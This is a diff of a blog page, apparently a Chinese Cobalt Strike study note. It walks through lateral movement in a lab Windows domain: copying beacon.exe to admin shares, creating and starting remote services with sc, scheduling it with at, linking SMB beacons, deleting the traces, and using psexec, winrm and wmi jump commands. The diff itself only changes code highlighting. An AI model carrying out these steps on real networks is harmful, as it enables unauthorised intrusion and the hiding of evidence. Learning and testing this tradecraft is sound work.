@@ -459,6 +459,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -474,123 +477,142 @@
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs19-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>如果用于内网中的横向移动，那么强烈建议使用 SMB Beacon，SMB Beacon 就是为了内网横向扩展渗透而设计的。</p>
 <h1 id="0x02-上传可执行文件"><a href="#0x02-上传可执行文件" class="headerlink" title="0x02 上传可执行文件"></a>0x02 上传可执行文件</h1><p>首先使用 Cobalt Strike 上的 <code>upload</code> 功能上传文件，接着复制文件到目标主机的其他位置。</p>
-<pre><code class="powershell">shell copy file.exe \\host\C$\Windows\Temp</code></pre>
-<pre><code class="powershell">beacon&gt; upload /root/beacon.exe
-[*] Tasked beacon to upload /root/Desktop/beacon.exe as beacon.exe
-[+] host called home, sent: 289302 bytes
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell <span class="token function">copy</span> file<span class="token punctuation">.</span>exe \\host\C$\Windows\Temp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-beacon&gt; shell copy beacon.exe \\WinTest\C$\Windows\Temp
-[*] Tasked beacon to run: copy beacon.exe \\WinTest\C$\Windows\Temp
-[+] host called home, sent: 72 bytes
-[+] received output:
-已复制         1 个文件。</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> upload <span class="token operator">/</span>root<span class="token operator">/</span>beacon<span class="token punctuation">.</span>exe
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to upload <span class="token operator">/</span>root<span class="token operator">/</span>Desktop<span class="token operator">/</span>beacon<span class="token punctuation">.</span>exe as beacon<span class="token punctuation">.</span>exe
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 289302 bytes
+
+beacon> shell <span class="token function">copy</span> beacon<span class="token punctuation">.</span>exe \\WinTest\C$\Windows\Temp
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">copy</span> beacon<span class="token punctuation">.</span>exe \\WinTest\C$\Windows\Temp
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 72 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+已复制         1 个文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h1 id="0x03-执行文件（方法一）"><a href="#0x03-执行文件（方法一）" class="headerlink" title="0x03 执行文件（方法一）"></a>0x03 执行文件（方法一）</h1><p>1、生成 Windows Service EXE 并上传</p>
 <p>2、在目标主机上创建一个服务</p>
-<pre><code class="powershell">shell sc \\host create name binpath= c:\windows\temp\file.exe</code></pre>
-<pre><code class="powershell">beacon&gt; shell sc \\wintest create beacon binpath= c:\windows\temp\beacon.exe
-[*] Tasked beacon to run: sc \\wintest create beacon binpath= c:\windows\temp\beacon.exe
-[+] host called home, sent: 93 bytes
-[+] received output:
-[SC] CreateService 成功</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell <span class="token function">sc</span> \\host create name binpath= c:\windows\temp\file<span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">sc</span> \\wintest create beacon binpath= c:\windows\temp\beacon<span class="token punctuation">.</span>exe
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">sc</span> \\wintest create beacon binpath= c:\windows\temp\beacon<span class="token punctuation">.</span>exe
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 93 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+<span class="token namespace">[SC]</span> CreateService 成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <blockquote>
 <p>注：记住 binpath 路径</p>
 </blockquote>
 <p>3、在目标主机上启动服务</p>
-<pre><code class="powershell">shell sc \\host start name</code></pre>
-<pre><code class="powershell">beacon&gt; shell sc \\wintest start beacon
-[*] Tasked beacon to run: sc \\wintest start beacon
-[+] host called home, sent: 56 bytes
-[+] received output:
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell <span class="token function">sc</span> \\host <span class="token function">start</span> name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">sc</span> \\wintest <span class="token function">start</span> beacon
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">sc</span> \\wintest <span class="token function">start</span> beacon
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 56 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
 SERVICE_NAME: beacon 
-        TYPE               : 10  WIN32_OWN_PROCESS  
+        <span class="token function">TYPE</span>               : 10  WIN32_OWN_PROCESS  
         STATE              : 2  START_PENDING 
-                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
-        WIN32_EXIT_CODE    : 0  (0x0)
-        SERVICE_EXIT_CODE  : 0  (0x0)
+                                <span class="token punctuation">(</span>NOT_STOPPABLE<span class="token punctuation">,</span> NOT_PAUSABLE<span class="token punctuation">,</span> IGNORES_SHUTDOWN<span class="token punctuation">)</span>
+        WIN32_EXIT_CODE    : 0  <span class="token punctuation">(</span>0x0<span class="token punctuation">)</span>
+        SERVICE_EXIT_CODE  : 0  <span class="token punctuation">(</span>0x0<span class="token punctuation">)</span>
         CHECKPOINT         : 0x0
         WAIT_HINT          : 0x7d0
         PID                : 3816
         FLAGS              : 
+        
+beacon> link wintest
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked to link to \\wintest\pipe\msagent_da00
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 36 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> established link to child beacon: 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>130<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-beacon&gt; link wintest
-[*] Tasked to link to \\wintest\pipe\msagent_da00
-[+] host called home, sent: 36 bytes
-[+] established link to child beacon: 192.168.175.130</code></pre>
 <p>4、清除痕迹与服务</p>
-<pre><code>shell sc \\host delete name</code></pre>
-<pre><code class="powershell">beacon&gt; shell del beacon.exe
-[*] Tasked beacon to run: del beacon.exe
-[+] host called home, sent: 57 bytes
+<pre class="line-numbers language-none"><code class="language-none">shell sc \\host delete name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-beacon&gt; shell del \\wintest\C$\windows\temp\beacon.exe
-[*] Tasked beacon to run: del \\wintest\C$\windows\temp\beacon.exe
-[+] host called home, sent: 83 bytes
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">del</span> beacon<span class="token punctuation">.</span>exe
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">del</span> beacon<span class="token punctuation">.</span>exe
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 57 bytes
 
-beacon&gt; shell sc \\wintest delete beacon
-[*] Tasked beacon to run: sc \\wintest delete beacon
-[+] host called home, sent: 69 bytes
-[+] received output:
-[SC] DeleteService 成功</code></pre>
+beacon> shell <span class="token function">del</span> \\wintest\C$\windows\temp\beacon<span class="token punctuation">.</span>exe
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">del</span> \\wintest\C$\windows\temp\beacon<span class="token punctuation">.</span>exe
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 83 bytes
+
+beacon> shell <span class="token function">sc</span> \\wintest delete beacon
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">sc</span> \\wintest delete beacon
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 69 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+<span class="token namespace">[SC]</span> DeleteService 成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h1 id="0x04-执行文件（方法二）"><a href="#0x04-执行文件（方法二）" class="headerlink" title="0x04 执行文件（方法二）"></a>0x04 执行文件（方法二）</h1><p>1、生成 Windows EXE 并上传，注意这里生成的 EXE 和<code>方法一</code>生成的 EXE 是不一样的类型，这里生成的是<code> Windows EXE</code>，不是方法一中的<code>Windows Service EXE</code></p>
 <p>2、找到目标系统上的时间</p>
-<pre><code class="powershell">shell net time \\host</code></pre>
-<pre><code class="powershell">beacon&gt; shell net time \\windc
-[*] Tasked beacon to run: net time \\windc
-[+] host called home, sent: 49 bytes
-[+] received output:
-\\windc 的当前时间是 2020/8/30 14:54:09
-命令成功完成。</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell net time \\host<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell net time \\windc
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: net time \\windc
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 49 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+\\windc 的当前时间是 2020<span class="token operator">/</span>8<span class="token operator">/</span>30 14:54:09
+命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>3、创建一个计划任务</p>
-<pre><code class="powershell">shell at \\host HH:mm C:\path\to\bad.exe</code></pre>
-<pre><code class="powershell">beacon&gt; shell at \\windc 15:00 C:\windows\temp\beacon.exe
-[*] Tasked beacon to run: at \\windc 15:00 C:\windows\temp\beacon.exe
-[+] host called home, sent: 76 bytes
-[+] received output:
-新加了一项作业，其作业 ID = 1</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell at \\host HH:mm C:\path\to\bad<span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell at \\windc 15:00 C:\windows\temp\beacon<span class="token punctuation">.</span>exe
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: at \\windc 15:00 C:\windows\temp\beacon<span class="token punctuation">.</span>exe
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 76 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+新加了一项作业，其作业 ID = 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>4、当计划任务被执行时，执行 link hostname 即可上线主机</p>
-<pre><code class="powershell">beacon&gt; link windc
-[*] Tasked to link to \\windc\pipe\msagent_d76a
-[+] host called home, sent: 34 bytes
-[+] established link to child beacon: 192.168.175.144</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> link windc
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked to link to \\windc\pipe\msagent_d76a
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 34 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> established link to child beacon: 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>144<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h1 id="0x05-beacon-的自动操作"><a href="#0x05-beacon-的自动操作" class="headerlink" title="0x05 beacon 的自动操作"></a>0x05 beacon 的自动操作</h1><p>前面说的两种执行文件的方法都需要往磁盘里上传文件，如果不想往磁盘中上传文件，也可以使用 beacon 的自动操作。</p>
 <ul>
 <li>使用一个服务运行可执行文件</li>
 </ul>
-<pre><code class="powershell">psexec [target] [share] [listener]</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">psexec <span class="token namespace">[target]</span> <span class="token namespace">[share]</span> <span class="token namespace">[listener]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <ul>
 <li>使用一个服务运行 Powershell 单行程序</li>
 </ul>
-<pre><code class="powershell">psexec_psh [target] [listener]</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">psexec_psh <span class="token namespace">[target]</span> <span class="token namespace">[listener]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <ul>
 <li>通过 WinRM 运行 Powershell 单行程序</li>
 </ul>
-<pre><code class="powershell">winrm [target] [listener]</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">winrm <span class="token namespace">[target]</span> <span class="token namespace">[listener]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <ul>
 <li>通过 WMI 运行 Powershell 单行程序</li>
 </ul>
-<pre><code class="powershell">wmi [target] [listener]</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wmi <span class="token namespace">[target]</span> <span class="token namespace">[listener]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>在 Cobalt Strike 的 <code>viwe --&gt; Targets</code> 下，右击主机选择 <code>Jump</code> 也可以通过图形化的方式进行上述操作，这样也使得横向移动更加的简单。</p>
 <p>接下来进行一下演示，目前手中有一个普通机器的管理员会话，我们先在这台机器上运行 <code>net view</code> 查看一下当前域环境中的主机信息。</p>
-<pre><code class="powershell">beacon&gt; net view
-[*] Tasked beacon to run net view
-[+] host called home, sent: 104504 bytes
-[+] received output:
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> net view
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run net view
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 104504 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
 List of hosts:
-[+] received output:
- Server Name             IP Address                       Platform  Version  Type   Comment
- -----------             ----------                       --------  -------  ----   -------            
- WINDC                   192.168.175.144                  500       6.1      PDC    
- WINTEST                 192.168.175.130                  500       6.1         </code></pre>
-<p>因为是自己本地搭建的测试环境，所以主机很少，可以看到当前域中有两台机器，再利用 PowerView 查找一下具有本地管理员访问权限的用户</p>
-<pre><code class="powershell">beacon&gt; powershell-import PowerView.ps1
-[*] Tasked beacon to import: PowerView.ps1
-[+] host called home, sent: 101224 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+ Server Name             IP Address                       Platform  Version  <span class="token function">Type</span>   Comment
+ <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>             <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>                       <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>  <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>  <span class="token operator">--</span>-<span class="token operator">-</span>   <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>            
+ WINDC                   192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>144                  500       6<span class="token punctuation">.</span>1      PDC    
+ WINTEST                 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>130                  500       6<span class="token punctuation">.</span>1         <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-beacon&gt; powershell Find-LocalAdminAccess
-[*] Tasked beacon to run: Find-LocalAdminAccess
-[+] host called home, sent: 329 bytes
-[+] received output:
-WinDC.teamssix.com</code></pre>
+<p>因为是自己本地搭建的测试环境，所以主机很少，可以看到当前域中有两台机器，再利用 PowerView 查找一下具有本地管理员访问权限的用户</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> powershell<span class="token operator">-</span>import PowerView<span class="token punctuation">.</span>ps1
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to import: PowerView<span class="token punctuation">.</span>ps1
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 101224 bytes
+
+beacon> powershell <span class="token function">Find-LocalAdminAccess</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">Find-LocalAdminAccess</span>
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 329 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+WinDC<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>接下来在 WinDC 上运行 psexec，因为这里是 64 位的，所以选择 psexec64，之后监听选择一个 smb beacon，会话就选择已经上线的 wintest 主机的会话，并勾选使用当前会话的访问令牌。</p>
 <p>这里笔者认为应该是因为当前在 wintest 主机上有 windc 的管理员账户登录着，所以使用 wintest 的访问令牌是可以获取 windc 的信任的，类似于 <a target="_blank" rel="noopener" href="https://teamssix.com/year/200419-150622.html">CS 学习笔记 17 节</a>里的描述方法，如有不正确之处，还请多多指教。</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs19-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
@@ -1028,7 +1050,7 @@ WinDC.teamssix.com</code></pre>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">162.6k</span>&nbsp;字
+                class="white-color">164k</span>&nbsp;字
             
             
             
